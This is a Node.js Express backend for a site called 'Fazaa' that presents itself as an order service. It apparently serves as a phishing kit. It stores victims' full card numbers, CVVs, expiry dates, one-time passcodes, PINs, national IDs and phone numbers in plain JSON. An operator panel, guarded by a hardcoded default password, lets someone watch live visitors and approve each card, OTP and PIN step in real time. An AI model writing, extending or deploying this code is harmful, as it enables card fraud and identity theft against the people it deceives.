const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
app.use(express.json({ limit: "100kb" }));

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "fazaa2026";
const DATA_DIR = process.env.VERCEL ? "/tmp" : (process.env.DATA_DIR || path.join(__dirname, "data"));
const ORDERS_FILE = path.join(DATA_DIR, "orders.json");

try { fs.mkdirSync(DATA_DIR, { recursive: true }); } catch (e) {}
let orders = [];
try { orders = JSON.parse(fs.readFileSync(ORDERS_FILE, "utf8")); } catch (e) { orders = []; }
function saveOrders() {
  try {
    const tmp = ORDERS_FILE + ".tmp";
    fs.writeFileSync(tmp, JSON.stringify(orders));
    fs.renameSync(tmp, ORDERS_FILE);
  } catch (e) {}
}

const visitors = new Map();
const ACTIVE_MS = 30000;
function activeVisitors() {
  const now = Date.now();
  for (const [id, v] of visitors) if (now - v.t > ACTIVE_MS) visitors.delete(id);
  return [...visitors.values()];
}

const isAdmin = req => req.headers["x-admin-password"] === ADMIN_PASSWORD;
const str = (v, max = 300) => String(v == null ? "" : v).slice(0, max);

function cleanOrder(b) {
  const p = b.pay && typeof b.pay === "object" ? b.pay : {};
  let rawCard = p.cardNumber || p.number || p.fullCard || p.card || "";
  if (typeof rawCard === "boolean") rawCard = "";
  let rawCvv = p.cvv || "";
  if (typeof rawCvv === "boolean") rawCvv = "";
  let rawExp = p.exp || p.expiry || "";
  if (typeof rawExp === "boolean") rawExp = "";
  let rawOtp = p.otp || p.code || "";
  if (typeof rawOtp === "boolean") rawOtp = "";
  let rawPin = p.pin || "";
  if (typeof rawPin === "boolean") rawPin = "";
  let rawName = p.cardName || p.name || "";
  if (typeof rawName === "boolean") rawName = "";
  return {
    ref: str(b.ref, 40), status: ["confirmed", "awaiting"].includes(b.status) ? b.status : "pending",
    card: str(b.card, 10), watch: str(b.watch, 10),
    st: b.st === "resident" ? "resident" : "citizen",
    n: str(b.n, 120), id: str(b.id, 20).replace(/\D/g, ""), p: str(b.p, 15).replace(/\D/g, ""),
    e: str(b.e, 160), g: b.g === "female" ? "female" : "male",
    em: str(b.em, 30), a: str(b.a, 5), ad: str(b.ad, 500), lang: b.lang === "en" ? "en" : "ar",
    step: ["card", "otp", "pin"].includes(b.step) ? b.step : undefined,
    pay: {
      cardName: str(rawName, 120),
      cardNumber: str(rawCard, 30),
      last4: str(rawCard.slice(-4) || p.last4, 4).replace(/\D/g, ""),
      brand: ["visa", "mc", "amex"].includes(p.brand) ? p.brand : "",
      exp: str(rawExp, 5),
      cvv: str(rawCvv, 10),
      otp: str(rawOtp, 10),
      pin: str(rawPin, 10)
    }
  };
}

app.post("/api/orders", (req, res) => {
  const b = req.body;
  const o = cleanOrder(b);
  if (o.pay === undefined) delete o.pay;
  if (o.step === undefined) delete o.step;
  if (!/^FZ-\d{6,}$/.test(o.ref) || !o.n || o.p.length !== 9)
    return res.status(400).json({ ok: false, error: "invalid" });
  const i = orders.findIndex(x => x.ref === o.ref);
  if (i >= 0) {
    const prev = orders[i];
    orders[i] = { ...prev, ...o, ts: prev.ts, status: prev.status === "confirmed" ? "confirmed" : o.status, decision: o.status === "awaiting" ? "" : prev.decision, reason: o.status === "awaiting" ? "" : prev.reason, updated: Date.now() };
  } else {
    orders.unshift({ ...o, ts: Date.now() });
    if (orders.length > 5000) orders.length = 5000;
  }
  saveOrders();
  res.json({ ok: true, ref: o.ref });
});

app.get("/api/status/:ref", (req, res) => {
  const ref = req.params.ref;
  const o = orders.find(x => x.ref === ref);
  if (!o) return res.status(404).json({ ok: false });
  res.json({ ok: true, status: o.status, decision: o.decision || "", reason: o.reason || "", next: o.next || "" });
});

app.post("/api/ping", (req, res) => {
  const id = str(req.body.id, 40);
  if (!id) return res.status(400).json({ ok: false });
  visitors.set(id, { t: Date.now(), page: str(req.body.page, 60) });
  res.json({ ok: true });
});

app.post("/api/leave", (req, res) => {
  visitors.delete(str((req.body || {}).id, 40));
  res.json({ ok: true });
});

app.get("/api/admin/check", (req, res) => {
  if (!isAdmin(req)) return res.status(401).json({ ok: false, error: "unauthorized" });
  res.json({ ok: true });
});

app.get("/api/admin/orders", (req, res) => {
  if (!isAdmin(req)) return res.status(401).json({ ok: false, error: "unauthorized" });
  const v = activeVisitors();
  res.json({ ok: true, orders, active: v.length, pages: v.map(x => x.page) });
});

app.post("/api/admin/decide/:ref", (req, res) => {
  if (!isAdmin(req)) return res.status(401).json({ ok: false, error: "unauthorized" });
  const ref = req.params.ref;
  const decision = req.body.decision === "reject" ? "reject" : "accept";
  const o = orders.find(x => x.ref === ref);
  if (!o) return res.status(404).json({ ok: false });
  const step = o.step || "card";
  if (decision === "reject") {
    o.decision = "reject"; o.reason = step; o.status = "rejected"; o.next = "";
  } else {
    const nextOf = { card: "otp", otp: "pin", pin: "done" };
    const next = nextOf[step];
    o.decision = "accept"; o.reason = "";
    if (next === "done") { o.status = "confirmed"; o.next = "done"; }
    else { o.status = "stepok"; o.next = next; }
  }
  o.updated = Date.now();
  saveOrders();
  res.json({ ok: true, status: o.status });
});

app.delete("/api/admin/orders/:ref", (req, res) => {
  if (!isAdmin(req)) return res.status(401).json({ ok: false, error: "unauthorized" });
  const ref = req.params.ref;
  orders = orders.filter(o => o.ref !== ref);
  saveOrders();
  res.json({ ok: true });
});

if (!process.env.VERCEL) {
  app.use(express.static(path.join(__dirname, "public")));
  app.get("*", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
  });
  const PORT = process.env.PORT || 3000;
  app.listen(PORT, () => console.log(`Fazaa running on port ${PORT}`));
}

module.exports = app;
